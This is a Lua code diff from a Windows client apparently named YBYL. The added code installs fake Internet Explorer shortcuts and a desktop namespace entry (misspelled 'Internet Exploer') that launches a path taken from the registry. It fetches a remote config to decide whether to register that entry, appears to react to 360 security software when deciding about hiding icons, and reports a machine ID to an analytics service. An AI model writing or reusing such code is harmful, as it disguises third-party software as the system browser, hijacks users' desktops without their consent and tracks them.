@@ -500,7 +500,7 @@ function TryInstallIE()
 	local strRegFSPath = "HKEY_CURRENT_USER\\SOFTWARE\\YBYL\\regie"
 	local nValue = FunctionObj.RegQueryValue(strRegFSPath)
 	if IsNilString(nValue) then 
-		return   --不是首次启动 
+		return   --不是首次启动  
 	end
 	
 	local strRegIEPath = "HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\Path"
@@ -511,6 +511,7 @@ function TryInstallIE()
 	if not tipUtil:QueryFileExists(GetIEPath()) then
 		return   
 	end
+	
 	DoInstallIE()
 	FunctionObj.RegDeleteValue(strRegFSPath)
 end
@@ -519,6 +520,24 @@ end
 function DoInstallIE()
 	WriteIERegister()
 	WriteIEShortCut()
+	SendInstallIEReport()
+end
+
+
+function SendInstallIEReport()
+	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
+	local rdRandom = tipUtil:GetCurrentUTCTime()
+	local strDefaultNil = "null"
+	
+	local strCID = FunctionObj.GetPeerID()
+	local strIEVersion = GetFakeIEVersion() 
+	local strInstallSrc = FunctionObj.GetInstallSrc()
+	
+	local strUrl = "http://www.google-analytics.com/collect?v=1&tid=UA-60726208-1&cid="..tostring(strCID)
+						.."&t=event&ec=".."startup_registerie".."&ea="..tostring(strIEVersion)
+						.."&el="..tostring(strInstallSrc).."&ev="..tostring(1)
+		
+	tipAsynUtil:AsynSendHttpStat(strUrl, function()	end)
 end
 
 
@@ -596,7 +615,6 @@ end
 
 function WriteIEShortCut()
 	CheckNeedHideICO(HideIEIco)
-	
 	WriteStartMenuSC()
 	WriteStartMenuProgramSC()
 	WriteQuickLaunchSC()
@@ -657,7 +675,7 @@ function CheckNeedHideICO(fnCallBack)
 				return 
 			end
 			
-			local nIgnore360, bRet = tipUtil:ReadINI(strIniPath, "entryaction", "desktop")
+			local nIgnore360, bRet = tipUtil:ReadINI(strIniPath, "entryaction", "dtcheck")
 			if not bRet or tostring(nIgnore360) ~= "0" then
 				DoDefaultOperation()
 				return
@@ -697,13 +715,13 @@ function WriteStartMenuSC()
 	local nCSIDL_STARTMENU = 0xB
 	local nCSIDL_COMMON_STARTMENU = 0x16
 	local tStartMenuClsidl = {nCSIDL_STARTMENU, nCSIDL_COMMON_STARTMENU}
-	
+
 	for _, nCsidl in pairs(tStartMenuClsidl) do
 		local strBaseDir = tipUtil:GetSpecialFolderPathEx(nCsidl)
 		if IsRealString(strBaseDir) and tipUtil:QueryFileExists(strBaseDir) then
-		
 			local strFilePath = tipUtil:PathCombine(strBaseDir, "Internet Explorer.lnk")
 			local bIsInDir,strCurrent = CheckIsIELnkInDir(strBaseDir)
+			
 			if bIsInDir then
 				tipUtil:PinToStartMenu4XP(strCurrent, false)
 				--local bret = tipUtil:DeletePathFile(strCurrent)
@@ -812,15 +830,84 @@ function WriteDesktopSC()
 			FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\DESKTOP", "1")
 		end
 		
-		local strIEPath = GetIEPath()
 		if nCsidlDesktop == nCSIDL_DESKTOP then
-			local bret = tipUtil:CreateShortCutLinkEx("Internet Explorer", strIEPath, strBaseDir, "", "/sstartfrom desktop", "启动 Internet Explorer 浏览器")
-			tipUtil:RefleshIcon(nil)
+			CreateDesktopShortCut()
 		end
 	end
 end
 
 
+function CreateDesktopShortCut()
+	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
+	
+	local strURL = "http://www.91yuanbao.com/cmi/iesetupconfig.js"
+	local strSysTempDir = tipUtil:GetSystemTempPath()
+	local strSavePath = tipUtil:PathCombine(strSysTempDir, "iesetupconfig.js")
+	
+	local strStamp = FunctionObj.GetTimeStamp()
+	local strURLFix = strURL..strStamp
+	
+	FunctionObj.NewAsynGetHttpFile(strURLFix, strSavePath, false, 
+		function(bRet, strIniPath)
+			FunctionObj.TipLog("[CheckNeedHideICO] NewAsynGetHttpFile bRet : "..tostring(bRet)
+								.."  strSavePath: "..tostring(strSavePath))
+		
+			if bRet ~= 0 or not tipUtil:QueryFileExists(strIniPath) then
+				CreateDesktopSCDefault()
+				return 
+			end
+			
+			local nDTType, bRet = tipUtil:ReadINI(strIniPath, "entrytype", "dttype")
+						
+			if not bRet or tostring(nDTType) ~= "1" then
+				CreateDesktopSCDefault()
+				return
+			end
+			
+			CreateDesktopReg()
+		end, 10*1000)
+end
+
+
+function CreateDesktopSCDefault()
+	local nCSIDL_DESKTOP = 0x10 
+	local strBaseDir = tipUtil:GetSpecialFolderPathEx(nCSIDL_DESKTOP)
+	local strIEPath = GetIEPath()
+	local bret = tipUtil:CreateShortCutLinkEx("Internet Explorer", strIEPath, strBaseDir, "", "/sstartfrom desktop", "启动 Internet Explorer 浏览器")
+	tipUtil:RefleshIcon(nil)
+end
+
+
+function CreateDesktopReg()
+	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
+	local bret = tipUtil:CreateRegKey("HKEY_CLASSES_ROOT","CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}")
+	FunctionObj.RegSetValue("HKEY_CLASSES_ROOT\\CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\InfoTip", "查找并显示 Iternet 上的信息和网站。")
+	FunctionObj.RegSetValue("HKEY_CLASSES_ROOT\\CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\LocalizedString", "Internet Explorer")
+
+	local strIEPath = GetIEPath()
+	tipUtil:CreateRegKey("HKEY_CLASSES_ROOT","CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\DefaultIcon")
+	FunctionObj.RegSetValue("HKEY_CLASSES_ROOT\\CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\DefaultIcon\\", strIEPath)
+
+	tipUtil:CreateRegKey("HKEY_CLASSES_ROOT","CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Open")
+	FunctionObj.RegSetValue("HKEY_CLASSES_ROOT\\CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Open\\", "打开主页(&H)")
+	
+	tipUtil:CreateRegKey("HKEY_CLASSES_ROOT","CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Open\\Command")
+	FunctionObj.RegSetValue("HKEY_CLASSES_ROOT\\CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Open\\Command\\", strIEPath)
+	
+	tipUtil:CreateRegKey("HKEY_CLASSES_ROOT","CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Prop")
+	FunctionObj.RegSetValue("HKEY_CLASSES_ROOT\\CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Prop\\", "属性(&R)")
+		
+	tipUtil:CreateRegKey("HKEY_CLASSES_ROOT","CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Prop\\Command")
+	FunctionObj.RegSetValue("HKEY_CLASSES_ROOT\\CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Prop\\Command\\", "Rundll32.exe Shell32.dll,Control_RunDLL Inetcpl.cpl")
+	
+	tipUtil:CreateRegKey("HKEY_LOCAL_MACHINE","SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Desktop\\NameSpace\\{8B3A6008-2057-415f-8BC9-144DF987051A}")
+	FunctionObj.RegSetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Desktop\\NameSpace\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\", "Internet Exploer")
+	
+	tipUtil:RefleshIcon(nil)
+end
+
+
+--检查IE 快捷方式是否在指定目录
 function CheckIsIELnkInDir(strDir)
 	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
 	local tFileList = tipUtil:FindFileList(strDir, "*.*")
